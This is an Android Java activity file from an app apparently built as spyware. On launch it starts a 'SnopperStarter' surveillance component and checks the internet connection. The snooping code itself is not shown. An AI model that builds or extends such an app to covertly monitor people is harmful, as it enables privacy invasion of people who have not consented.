package com.gameofcoding.spy.activities;

import android.app.Activity;
import android.os.Bundle;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.spys.SnopperStarter;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
	XLog.v(TAG, "App Started through main activity");
	new SnopperStarter(this).start();
	final Utils util = new Utils(this);
	new Thread(new Runnable() {
		public void run() {
		    try {
			if(util.hasActiveInternetConnection()) {
			    XLog.d(TAG, "Active");
			} else {
			    XLog.d(TAG, "Nope");
			}
		    } catch(Exception e) {
			throw new RuntimeException(e);
		    }
		}
	    }).start();
    }
}
